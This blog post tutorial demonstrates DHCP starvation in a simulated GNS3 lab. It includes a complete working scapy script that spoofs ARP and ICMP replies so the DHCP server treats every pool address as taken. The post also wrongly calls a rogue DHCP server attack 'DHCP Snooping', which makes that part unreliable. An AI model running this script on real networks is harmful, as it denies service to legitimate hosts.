---
layout: post
title:  "DHCP starvation attack without making any DHCP requests"
date:   2020-08-20 00:00:00 -0400
tags: [advanced, application, cybersecurity, networking, dhcp]
excerpt: Most defense systems filter out repeated DHCP requests. What if you could perform DHCP starvation without sending a DCHP request?
---

DHCP, Dynamic host configuration protocol, is a network protocol that offers an IP address and other required details that include gateway IP, DNS IP to a host that enters a network. The DHCP protocol as defined in [RFC2131](https://tools.ietf.org/html/rfc2131) involves 4 transactions back and forth between the client and server, namely:

* DHCP Discover - broadcast from the client
* DHCP Offer - broadcast from the server
* DHCP Request - unicast from client
* DHCP ACK - unicast from server

[Wikipedia explains the DHCP protocol amazingly!](https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol)

## DHCP Attacks

Similar to the ARP protocol, due to its inability to authenticate users who enter the network, there have been multiple types of attacks on the protocol. Here are some of the well-known DHCP attacks:

* **DHCP Snooping**: In this attack, a malicious client acts as a DHCP server and services clients as they enter the network. The malicious client could send custom gateway and DNS server IPs to establish itself as a man-in-the-middle and perform DNS poisoning.
* **DHCP Starvation**: In this attack, a malicious client sends multiple DHCP requests and holds all the IP address present in the DHCP pool, thereby not allowing any new host to join the network. Denial of Service.

## DHCP starvation - Protocol dissection

The following image shows a screenshot of the packet capture during a DHCP transaction.

![Packet capture of DHCP transactions](/assets/img/dhcp-starvation/dhcp.png)
<br/><small style="color: gray">Packet capture of DHCP transactions</small><br/>

### What is ARP doing here?

The DHCP server broadcasts an ARP request followed by an ICMP request to ensure that the IP address that it is going to DHCP Offer is indeed available. Eureka?

Why does one need to make a DHCP request to starve the DHCP pool? Most of the defensive systems look for repeated DHCP requests from the same MAC address. What if I replied to DHCP's ARP request and made DHCP believe that the IP address is already in use?

Thus, in this article let's see how one can carry out ARP spoofing to impersonate a client that does not exist to make the DHCP server believe that the IP address that is picked from the pool to make DHCP Offer is already held by another client.

## The Experiment

In this experiment, let us use [GNS3](https://www.gns3.com/), a network simulation tool, and [Docker](https://www.docker.com/) containers as a DHCP server, a malicious client, and a benign client.

### DHCP Server

Let us create a DHCP server from scratch. Login to the GNS3 VM (this is where containers spin up). ISC DHCP server software is used to configure and run a DHCP server in ubuntu container [[Reference](https://www.tecmint.com/install-dhcp-server-in-ubuntu-debian/)].

* Create a Dockerfile with the following contents:

```dockerfile
FROM ubuntu
RUN apt-get update && apt-get install -y vim net-tools isc-dhcp-server
```

* Build the docker image by running `docker build -t dhcp-server .`
* Then, import the built docker image as a GNS3 appliance. [how](https://docs.gns3.com/docs/emulators/docker-support-in-gns3/)?
* Drag in the created appliance into the GNS3 workspace.
* Start the server by right-clicking and selecting "start". Double-click the node to get a console.
* Navigate to `/etc/dhcp` and append the following content to the `dhcpd.conf` file.

```
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.150 192.168.1.160;
    option routers 192.168.1.1;
    option domain-name-servers 192.168.1.1;
    option domain-name "example.org";
}
```

* Create an empty file, for the DHCP server to hold the leased IP addresses, by running the command:

```bash
touch /var/lib/dhcp/dhcpd.lease
```

* Further, assign an IP address to the DHCP server by running the following command:

```bash
ifconfig eth0 192.168.1.1/24
```

* Finally, startup the DHCP server by running the command `dhcpd`

### Malicious Client and Benign Client

The malicious client is a Linux machine with [scapy](https://scapy.net/) installed, [`ehlers/scapy`](https://hub.docker.com/r/ehlers/scapy). Import this docker image to GNS3 as an appliance too, and drag in an instance of this into the workspace. Right-click on the malicious client instance on the workspace and `edit config` to uncomment the lines under DHCP config. This configures the instance to obtain an IP address from the DHCP server.

![Malicious client configuration](/assets/img/dhcp-starvation/mal-client.png)

Before we start up the malicious client, drag in a GNS3 default switch to the workspace. Then, connect the malicious client and the DHCP server to the switch. Drag in another instance of `ehlers/scapy` which plays the role of a benign client. Edit the configuration to make it look similar to the malicious client. After the setup, the network looks similar to the following image:

![Network Topology](/assets/img/dhcp-starvation/net-topo.png)

It's time!

Right-click on the link between the DHCP server and the switch to begin packet capture. Then, startup the malicious client.

Observe that the DHCP transactions happen and the malicious client successfully gets an IP address.

## Attack

Get a console by double-clicking on the malicious client and create a `arp_spoof.py` python file with the following content.

```python
import sys

from threading import Thread
from scapy.all import *

INTERFACE = "eth0"
MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
MY_IP_ADDRESS = get_if_addr(INTERFACE)

'''
Approach 2: Using AnsweringMachine
$ python3 arp_spoof.py
'''

class ARPSpoofer(AnsweringMachine):
    def is_request(self, request):
        return request.haslayer('ARP') and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS
    
    def make_reply(self, request):
        response = Ether()/ARP()

        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS

        response[ARP].op = 2
        response[ARP].hwsrc = MY_MAC_ADDRESS
        response[ARP].hwdst = request[ARP].hwsrc
        response[ARP].psrc = request[ARP].pdst
        response[ARP].pdst = request[ARP].psrc

        return response[ARP]

class PingResponder(AnsweringMachine):
    def is_request(self, request):
        return request.haslayer('ICMP') and request[ICMP].type == 8 and request[IP].dst != MY_IP_ADDRESS
    
    def make_reply(self, request):
        response = Ether()/IP()/ICMP()/""

        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS

        response[IP].src = request[IP].dst
        response[IP].dst = request[IP].src

        response[ICMP].type = 0
        response[ICMP].id = request[ICMP].id
        response[ICMP].seq = request[ICMP].seq

        response[Raw].load = request[Raw].load

        return response[IP]

arp_spoofer = Thread(target=ARPSpoofer())
arp_spoofer.start()

ping_responder = Thread(target=PingResponder())
ping_responder.start()

arp_spoofer.join()
ping_responder.join()
```

The code performs ARP spoofing and is explained in [one of my older articles](/2020/08/02/arp-spoofing-using-scapy.html) in detail. In brief, each thread listens to a specific type of request i.e. ARP request and ICMP request and responds to them accordingly. As the ARP requests are replied by the malicious node, the switch believes that the MAC address associated with the IP address in question (ARP protocol) is that of the malicious node's MAC address. That is how ARP spoofing is achieved.

Run the python code by hitting the following command:

```bash
python arp_spoof.py
```

Now, start up the benign client and observe!

### Observation

Double click on the benign client to get a console. Run, `ifconfig` and observe that the benign client hasn't received an IP address yet!

### Why?

Observe the running packet capture.

![DHCP starvation in action](/assets/img/dhcp-starvation/dhcp-starvation.png)

The benign client continuously makes DHCP Discover, while the DHCP server is busy crafting the DHCP Offer. The DHCP server is not able to find an available IP address in it's DHCP pool. It finds an IP address from the DHCP pool, checks if it already taken by another host by making an ARP request followed by an ICMP request, and that is where the malicious client jumps in to respond to those messages. Thus, the DHCP server concludes that the IP address is already taken and skips to the following available IP address in the pool. The process repeats infinitely, and the benign client stays without an IP address. Hence, a DHCP starvation attack was carried out!

> I have them all, but I can't use any! - DHCP Server

